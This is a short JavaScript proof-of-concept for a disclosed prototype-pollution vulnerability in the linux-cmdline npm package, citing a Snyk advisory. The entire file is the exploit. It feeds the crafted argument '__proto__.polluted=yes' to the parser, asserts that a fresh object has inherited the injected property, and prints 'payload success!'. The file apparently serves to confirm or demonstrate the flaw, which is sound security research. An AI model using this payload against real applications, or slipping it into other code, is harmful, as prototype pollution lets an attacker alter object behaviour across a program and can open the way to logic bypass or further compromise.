//https://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674

const linuxCmdline = require('linux-cmdline');
const { assert } = require("@firebase/util");
var obj = {}
console.log("Before : " + obj.polluted);
linuxCmdline('__proto__.polluted=yes');
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");